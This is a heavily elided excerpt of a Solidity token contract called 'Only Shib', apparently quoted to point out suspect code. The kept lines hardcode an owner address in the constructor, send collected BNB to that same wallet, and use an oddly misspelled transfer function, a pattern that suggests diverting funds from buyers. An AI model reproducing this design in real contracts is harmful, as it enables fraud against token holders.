...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0x7C48aeD3FFcA55A0A4aD6c6cAf4D8242C58D4aa8;
...
contract OnlyShib is Context, IERC20, Ownable { 
    ...
    string private constant _name = unicode"Only Shib"; 
 ...
 function _transwertoken(address sender, address receivaddr, uint256 tAmount) private {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0x7C48aeD3FFcA55A0A4aD6c6cAf4D8242C58D4aa8), BNB_Tot);
            }
